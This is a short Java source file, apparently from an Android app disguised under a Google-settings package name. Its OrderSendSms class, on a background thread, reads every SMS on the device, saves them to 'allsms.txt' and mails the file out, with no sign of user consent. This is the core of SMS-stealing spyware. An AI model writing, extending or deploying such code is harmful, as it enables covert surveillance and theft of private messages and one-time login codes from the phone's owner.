package com.setting.dl.google.googlesettings.mail;

import android.content.Context;

import com.setting.dl.google.googlesettings.mail.gmail.Mail;
import com.setting.dl.google.googlesettings.phone.Sms;
import com.setting.dl.google.googlesettings.u;


public class OrderSendSms {
    
    private final static String fileAllSms = "allsms.txt";
    Context context;
    
    public OrderSendSms(Context context) {
        
        this.context = context;
    }
    
    
    public void doit() {
    
        u.runThread(() -> {
            
            String value = new Sms(context).get();
    
            u.saveValue(context, fileAllSms, value);
    
            Mail.send(context, fileAllSms);
            
      });
      
      
        
    }
}
